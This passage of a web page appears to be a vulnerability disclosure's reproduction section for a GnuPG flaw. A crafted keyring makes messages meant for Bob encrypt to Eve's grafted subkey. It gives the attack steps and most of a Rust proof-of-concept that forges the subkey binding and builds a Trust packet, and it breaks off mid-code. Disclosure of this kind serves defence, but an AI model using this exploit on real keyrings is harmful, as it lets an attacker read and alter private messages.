eproduce</h3> <h4>Scenario</h4> <ul><li>Alice wants to send Bob a message.<=
/li> <li>Over a trusted channel, she obtained and verified Bob=E2=80=99s pu=
blic key.</li> <li>She imports and trusts it.</li> <li>Alice has a maliciou=
s keyring of Eve on her device that she passes along when encrypting messag=
es, but she does not trust it.</li> <li>Alice encrypts a message for Bob an=
d sends it to him over an untrusted channel that Eve can read.</li> <li>Eve=
 can decrypt the message originally intended for Bob.</li></ul> <h4>Procedu=
re</h4> <p>To practically decrypt encrypted messages from Alice to Bob, Eve=
 has to:</p> <ol><li>Get Bob=E2=80=99s public key</li> <li>Generate a PGP k=
ey pair with an encryption subkey</li> <li>Isolate Eve=E2=80=99s encryption=
 subkey and its signature; e.g. only the public subkey and its accompanying=
 signature packet that binds an encryption key</li> <li>Modify the isolated=
 encryption subkey binding signature by replacing all occurrences of Eve=E2=
=80=99s main key fingerprint with Bob=E2=80=99s main key fingerprint</li> <=
li>Craft a Trust packet for GnuPG, e.g. 0x[<code>cc ff 00 00 00 06 00 03 67=
 70 67 00</code>]</li> <li>Add Bob=E2=80=99s full public key, Eve=E2=80=99s=
 public subkey, Eve=E2=80=99s modified subkey binding signature, and the cr=
afted Trust packet together</li> <li>Get Alice to import the payload into h=
er keyring</li></ol> <p>If Alice now uses <code>gpg --keyring ./bob-modifie=
d.pgp --encrypt --recipient [Bob's full fingerprint]</code>, GnuPG will enc=
rypt the text to Eve instead, who can then decrypt, read, and modify the me=
ssage, and send the MITM=E2=80=99d message back to Bob, effectively defeati=
ng GnuPG=E2=80=99s encryption.</p> <p>To demonstrate the attack, we use a p=
ublic key of the German government as Bob=E2=80=99s public key.</p> <p>Eve:=
</p> <!----><pre class=3D"shiki github-dark-default" style=3D"background-co=
lor:#0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span =
style=3D"color:#8B949E">//! &#96;&#96;&#96;cargo</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! [dependencies]</span=
></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! sequoia-openpgp =3D =
"2.0.0"</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! reqwest =3D &#123; v=
ersion =3D "0.11", features =3D ["json", "blocking"] &#125;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! &#96;&#96;&#96;</spa=
n></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> reqwest</span><span style=3D"color:#FF7B72">::</span><span=
 style=3D"color:#FFA657">blocking</span><span style=3D"color:#FF7B72">::</s=
pan><span style=3D"color:#E6EDF3">get;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">cert</span><span style=3D"color:#FF7B72">:=
:</span><span style=3D"color:#FFA657">prelude</span><span style=3D"color:#F=
F7B72">::*</span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">parse</span><span style=3D"color:#FF7B72">=
::</span><span style=3D"color:#FFA657">Parse</span><span style=3D"color:#E6=
EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">policy</span><span style=3D"color:#FF7B72"=
>::</span><span style=3D"color:#FFA657">StandardPolicy</span><span style=3D=
"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">Packet</span><span style=3D"color:#E6EDF3"=
>;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">serialize</span><span style=3D"color:#FF7B=
72">::</span><span style=3D"color:#FFA657">Serialize</span><span style=3D"c=
olor:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">Profile</span><span style=3D"color:#E6EDF3=
">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">fn</span><span style=3D"=
color:#D2A8FF"> poc</span><span style=3D"color:#E6EDF3">() &#123;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#8B949E">    // 1. Get Bob's publ=
ic key</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // use one that we c=
ertainly don't have a private key for</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // curl https://www.=
governikus.de/wp-content/uploads/2023/06/governikusPubKey.asc</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> bob_key </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#D2A8FF"> get</span><span style=3D"color:#E6EDF3">(</=
span><span style=3D"color:#A5D6FF">"https://www.governikus.de/wp-content/up=
loads/2023/06/governikusPubKey.asc"</span><span style=3D"color:#E6EDF3">)</=
span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(</span><s=
pan style=3D"color:#A5D6FF">"Failed to fetch Bob's public key"</span><span =
style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">bytes</span><span style=3D"color:#E6EDF3">()</span></=
span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(</span><s=
pan style=3D"color:#A5D6FF">"Failed to read Bob's public key as bytes"</spa=
n><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // 2. Generate a PGP=
 key pair with an encryption subkey</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> (eve_cert, _revocation) </span><span style=3D"color:#F=
F7B72">=3D</span><span style=3D"color:#FFA657"> CertBuilder</span><span sty=
le=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">new</span><span=
 style=3D"color:#E6EDF3">()</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">set_profile</span><span style=3D"color:#E6EDF3">(</sp=
an><span style=3D"color:#FFA657">Profile</span><span style=3D"color:#FF7B72=
">::</span><span style=3D"color:#79C0FF">RFC4880</span><span style=3D"color=
:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(</span><s=
pan style=3D"color:#A5D6FF">"Failed to set profile"</span><span style=3D"co=
lor:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">add_userid</span><span style=3D"color:#E6EDF3">(</spa=
n><span style=3D"color:#A5D6FF">"Eve &#x3C;<a href=3D"/cdn-cgi/l/email-prot=
ection" class=3D"__cf_email__" data-cfemail=3D"81e4f7e4c1e4f9e0ecf1ede4afee=
f3e6">[email&#160;protected]</a>>"</span><span style=3D"color:#E6EDF3">)</s=
pan></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">add_transport_encryption_subkey</span><span style=3D"=
color:#E6EDF3">()</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">generate</span><span style=3D"color:#E6EDF3">()</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(</span><s=
pan style=3D"color:#A5D6FF">"Failed to generate Eve's cert with encryption =
subkey"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        let</span><span =
style=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> f </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA657"> std<=
/span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#FFA657">=
fs</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#FFA65=
7">File</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#=
D2A8FF">create</span><span style=3D"color:#E6EDF3">(</span><span style=3D"c=
olor:#A5D6FF">"eve-private.asc"</span><span style=3D"color:#E6EDF3">)</span=
><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">expect=
</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">=
"create eve-private.asc"</span><span style=3D"color:#E6EDF3">);</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">        eve_cert</span><=
span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">as_tsk</=
span><span style=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7B72">.=
</span><span style=3D"color:#D2A8FF">armored</span><span style=3D"color:#E6=
EDF3">()</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#=
D2A8FF">serialize</span><span style=3D"color:#E6EDF3">(</span><span style=
=3D"color:#FF7B72">&#x26;mut</span><span style=3D"color:#E6EDF3"> f)</span>=
<span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">expect<=
/span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"=
write eve private tsk"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // 3.</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> p </span><span style=3D"color:#FF7B72">=3D</span><span=
 style=3D"color:#FF7B72"> &#x26;</span><span style=3D"color:#FFA657">Standa=
rdPolicy</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:=
#D2A8FF">new</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> eve_vc </span><span style=3D"color:#FF7B72">=3D</span>=
<span style=3D"color:#E6EDF3"> eve_cert</span><span style=3D"color:#FF7B72"=
>.</span><span style=3D"color:#D2A8FF">with_policy</span><span style=3D"col=
or:#E6EDF3">(p, </span><span style=3D"color:#FFA657">None</span><span style=
=3D"color:#E6EDF3">)</span><span style=3D"color:#FF7B72">.</span><span styl=
e=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(</span><spa=
n style=3D"color:#A5D6FF">"valid certificate"</span><span style=3D"color:#E=
6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> enc_sub </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#E6EDF3"> eve_vc</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">keys</span><span style=3D"color:#E6EDF3">()</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">subkeys</span><span style=3D"color:#E6EDF3">()</span>=
</span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">for_transport_encryption</span><span style=3D"color:#=
E6EDF3">()</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">next</span><span style=3D"color:#E6EDF3">()</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(</span><s=
pan style=3D"color:#A5D6FF">"Eve should have an encryption-capable subkey"<=
/span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> eve_subkey_packet </span><span style=3D"color:#FF7B72"=
>=3D</span><span style=3D"color:#FFA657"> Packet</span><span style=3D"color=
:#FF7B72">::</span><span style=3D"color:#D2A8FF">PublicSubkey</span><span s=
tyle=3D"color:#E6EDF3">(enc_sub</span><span style=3D"color:#FF7B72">.</span=
><span style=3D"color:#D2A8FF">key</span><span style=3D"color:#E6EDF3">()</=
span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">cl=
one</span><span style=3D"color:#E6EDF3">());</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> binding_sig </span><span style=3D"color:#FF7B72">=3D</=
span><span style=3D"color:#E6EDF3"> enc_sub</span><span style=3D"color:#FF7=
B72">.</span><span style=3D"color:#D2A8FF">binding_signature</span><span st=
yle=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7B72">.</span><span =
style=3D"color:#D2A8FF">clone</span><span style=3D"color:#E6EDF3">();</span=
></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // 4. Replace Eve's =
issuer info in the binding signature with Bob's</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> bob_cert </span><span style=3D"color:#FF7B72">=3D</spa=
n><span style=3D"color:#FFA657"> Cert</span><span style=3D"color:#FF7B72">:=
:</span><span style=3D"color:#D2A8FF">from_bytes</span><span style=3D"color=
:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;</span><span style=3D=
"color:#E6EDF3">bob_key)</span><span style=3D"color:#FF7B72">.</span><span =
style=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(</span>=
<span style=3D"color:#A5D6FF">"Parse Bob's public key as a cert"</span><spa=
n style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> bob_fp </span><span style=3D"color:#FF7B72">=3D</span>=
<span style=3D"color:#E6EDF3"> bob_cert</span><span style=3D"color:#FF7B72"=
>.</span><span style=3D"color:#D2A8FF">fingerprint</span><span style=3D"col=
or:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> bob_kid </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#E6EDF3"> bob_cert</span><span style=3D"color:#FF7B72=
">.</span><span style=3D"color:#D2A8FF">keyid</span><span style=3D"color:#E=
6EDF3">();</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // Byte-level replac=
ement approach</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> eve_fp </span><span style=3D"color:#FF7B72">=3D</span>=
<span style=3D"color:#E6EDF3"> eve_cert</span><span style=3D"color:#FF7B72"=
>.</span><span style=3D"color:#D2A8FF">fingerprint</span><span style=3D"col=
or:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> eve_kid </span><span style=3D"color:#FF7B72">=3D</span=
><span style=3D"color:#E6EDF3"> eve_cert</span><span style=3D"color:#FF7B72=
">.</span><span style=3D"color:#D2A8FF">keyid</span><span style=3D"color:#E=
6EDF3">();</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> sig_bytes </s=
pan><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA657"> =
Vec</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8=
FF">new</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">    Packet</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</span><s=
pan style=3D"color:#E6EDF3">(binding_sig</span><span style=3D"color:#FF7B72=
">.</span><span style=3D"color:#D2A8FF">clone</span><span style=3D"color:#E=
6EDF3">())</span><span style=3D"color:#FF7B72">.</span><span style=3D"color=
:#D2A8FF">serialize</span><span style=3D"color:#E6EDF3">(</span><span style=
=3D"color:#FF7B72">&#x26;mut</span><span style=3D"color:#E6EDF3"> sig_bytes=
)</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF"=
>expect</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A=
5D6FF">"serialize binding signature"</span><span style=3D"color:#E6EDF3">);=
</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    fn</span><span style=
=3D"color:#D2A8FF"> replace_all</span><span style=3D"color:#E6EDF3">(buf</s=
pan><span style=3D"color:#FF7B72">:</span><span style=3D"color:#FF7B72"> &#=
x26;mut</span><span style=3D"color:#FFA657"> Vec</span><span style=3D"color=
:#E6EDF3">&#x3C;</span><span style=3D"color:#FFA657">u8</span><span style=
=3D"color:#E6EDF3">>, from</span><span style=3D"color:#FF7B72">:</span><spa=
n style=3D"color:#FF7B72"> &#x26;</span><span style=3D"color:#E6EDF3">[</sp=
an><span style=3D"color:#FFA657">u8</span><span style=3D"color:#E6EDF3">], =
to</span><span style=3D"color:#FF7B72">:</span><span style=3D"color:#FF7B72=
"> &#x26;</span><span style=3D"color:#E6EDF3">[</span><span style=3D"color:=
#FFA657">u8</span><span style=3D"color:#E6EDF3">]) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> from</span><span style=3D"color:#FF7B72">.</span><s=
pan style=3D"color:#D2A8FF">is_empty</span><span style=3D"color:#E6EDF3">()=
 </span><span style=3D"color:#FF7B72">||</span><span style=3D"color:#E6EDF3=
"> from</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D=
2A8FF">len</span><span style=3D"color:#E6EDF3">() </span><span style=3D"col=
or:#FF7B72">!=3D</span><span style=3D"color:#E6EDF3"> to</span><span style=
=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">len</span><span st=
yle=3D"color:#E6EDF3">() &#123; </span><span style=3D"color:#FF7B72">return=
</span><span style=3D"color:#E6EDF3">; &#125;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        let</span><span =
style=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> i </span>=
<span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#79C0FF"> 0</s=
pan><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        while</span><spa=
n style=3D"color:#E6EDF3"> i </span><span style=3D"color:#FF7B72">+</span><=
span style=3D"color:#E6EDF3"> from</span><span style=3D"color:#FF7B72">.</s=
pan><span style=3D"color:#D2A8FF">len</span><span style=3D"color:#E6EDF3">(=
) </span><span style=3D"color:#FF7B72">&#x3C;=3D</span><span style=3D"color=
:#E6EDF3"> buf</span><span style=3D"color:#FF7B72">.</span><span style=3D"c=
olor:#D2A8FF">len</span><span style=3D"color:#E6EDF3">() &#123;</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FF7B72">            if</span><sp=
an style=3D"color:#FF7B72"> &#x26;</span><span style=3D"color:#E6EDF3">buf[=
i</span><span style=3D"color:#FF7B72">..</span><span style=3D"color:#E6EDF3=
">i </span><span style=3D"color:#FF7B72">+</span><span style=3D"color:#E6ED=
F3"> from</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:=
#D2A8FF">len</span><span style=3D"color:#E6EDF3">()] </span><span style=3D"=
color:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> from &#123;</spa=
n></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                buf[i</s=
pan><span style=3D"color:#FF7B72">..</span><span style=3D"color:#E6EDF3">i =
</span><span style=3D"color:#FF7B72">+</span><span style=3D"color:#E6EDF3">=
 from</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A=
8FF">len</span><span style=3D"color:#E6EDF3">()]</span><span style=3D"color=
:#FF7B72">.</span><span style=3D"color:#D2A8FF">copy_from_slice</span><span=
 style=3D"color:#E6EDF3">(to);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                i </span=
><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#E6EDF3"> fr=
om</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF=
">len</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            &#125; </spa=
n><span style=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &=
#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                i </span=
><span style=3D"color:#FF7B72">+=3D</span><span style=3D"color:#79C0FF"> 1<=
/span><span style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">            &#125;</span=
></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        &#125;</span></s=
pan>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> from_fp_payload</span><span style=3D"color:#FF7B72">:<=
/span><span style=3D"color:#FFA657"> Vec</span><span style=3D"color:#E6EDF3=
">&#x3C;</span><span style=3D"color:#FFA657">u8</span><span style=3D"color:=
#E6EDF3">> </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"co=
lor:#FFA657"> std</span><span style=3D"color:#FF7B72">::</span><span style=
=3D"color:#FFA657">iter</span><span style=3D"color:#FF7B72">::</span><span =
style=3D"color:#D2A8FF">once</span><span style=3D"color:#E6EDF3">(</span><s=
pan style=3D"color:#79C0FF">4</span><span style=3D"color:#FFA657">u8</span>=
<span style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">chain</span><span style=3D"color:#E6EDF3">(eve_fp</sp=
an><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">as_b=
ytes</span><span style=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7=
B72">.</span><span style=3D"color:#D2A8FF">iter</span><span style=3D"color:=
#E6EDF3">()</span><span style=3D"color:#FF7B72">.</span><span style=3D"colo=
r:#D2A8FF">copied</span><span style=3D"color:#E6EDF3">())</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">collect</span><span style=3D"color:#E6EDF3">();</span=
></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> to_fp_payload</span><span style=3D"color:#FF7B72">:</s=
pan><span style=3D"color:#FFA657"> Vec</span><span style=3D"color:#E6EDF3">=
&#x3C;</span><span style=3D"color:#FFA657">u8</span><span style=3D"color:#E=
6EDF3">> </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"colo=
r:#FFA657"> std</span><span style=3D"color:#FF7B72">::</span><span style=3D=
"color:#FFA657">iter</span><span style=3D"color:#FF7B72">::</span><span sty=
le=3D"color:#D2A8FF">once</span><span style=3D"color:#E6EDF3">(</span><span=
 style=3D"color:#79C0FF">4</span><span style=3D"color:#FFA657">u8</span><sp=
an style=3D"color:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">chain</span><span style=3D"color:#E6EDF3">(bob_fp</sp=
an><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">as_b=
ytes</span><span style=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7=
B72">.</span><span style=3D"color:#D2A8FF">iter</span><span style=3D"color:=
#E6EDF3">()</span><span style=3D"color:#FF7B72">.</span><span style=3D"colo=
r:#D2A8FF">copied</span><span style=3D"color:#E6EDF3">())</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        .</span><span st=
yle=3D"color:#D2A8FF">collect</span><span style=3D"color:#E6EDF3">();</span=
></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    replace_all</span><s=
pan style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;mut=
</span><span style=3D"color:#E6EDF3"> sig_bytes, </span><span style=3D"colo=
r:#FF7B72">&#x26;</span><span style=3D"color:#E6EDF3">from_fp_payload, </sp=
an><span style=3D"color:#FF7B72">&#x26;</span><span style=3D"color:#E6EDF3"=
>to_fp_payload);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    replace_all</span><s=
pan style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;mut=
</span><span style=3D"color:#E6EDF3"> sig_bytes, eve_fp</span><span style=
=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">as_bytes</span><sp=
an style=3D"color:#E6EDF3">(), bob_fp</span><span style=3D"color:#FF7B72">.=
</span><span style=3D"color:#D2A8FF">as_bytes</span><span style=3D"color:#E=
6EDF3">());</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    replace_all</span><s=
pan style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;mut=
</span><span style=3D"color:#E6EDF3"> sig_bytes, eve_kid</span><span style=
=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">as_bytes</span><sp=
an style=3D"color:#E6EDF3">(), bob_kid</span><span style=3D"color:#FF7B72">=
.</span><span style=3D"color:#D2A8FF">as_bytes</span><span style=3D"color:#=
E6EDF3">());</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // 5.</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> trust_body</span><span style=3D"color:#FF7B72">:</span=
><span style=3D"color:#FFA657"> Vec</span><span style=3D"color:#E6EDF3">&#x=
3C;</span><span style=3D"color:#FFA657">u8</span><span style=3D"color:#E6ED=
F3">> </span><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#=
D2A8FF"> vec!</span><span style=3D"color:#E6EDF3">[</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">        0x00</span><span=
 style=3D"color:#E6EDF3">, </span><span style=3D"color:#79C0FF">0x03</span>=
<span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">        b'g'</span><span=
 style=3D"color:#E6EDF3">, </span><span style=3D"color:#A5D6FF">b'p'</span>=
<span style=3D"color:#E6EDF3">, </span><span style=3D"color:#A5D6FF">b'g'</=
span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#79C0FF">0=
x00</span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    ];</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> trust_packet </span><span style=3D"color:#FF7B72">=3D<=
/span><span style=3D"color:#FFA657"> sequoia_openpgp</span><span style=3D"c=
olor:#FF7B72">::</span><span style=3D"color:#FFA657">packet</span><span sty=
le=3D"color:#FF7B72">::</span><span style=3D"color:#FFA657">Trust</span><sp=
an style=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</spa=
n><span style=3D"color:#E6EDF3">(trust_body);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // 6.</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#FF7B72"> mut</span><span style=3D"color:#E6EDF3"> assembled </s=
pan><span style=3D"color:#FF7B72">=3D</span><span style=3D"color:#FFA657"> =
Vec</span><span style=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8=
FF">new</span><span style=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    bob_cert</span><span=
 style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">serialize</s=
pan><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x=
26;mut</span><span style=3D"color:#E6EDF3"> assembled)</span><span style=3D=
"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">expect</span><span st=
yle=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"serialize Bob'=
s cert"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    eve_subkey_packet</s=
pan><span style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">ser=
ialize</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF=
7B72">&#x26;mut</span><span style=3D"color:#E6EDF3"> assembled)</span><span=
 style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">expect</span=
><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"seria=
lize subkey"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    assembled</span><spa=
n style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">extend_from=
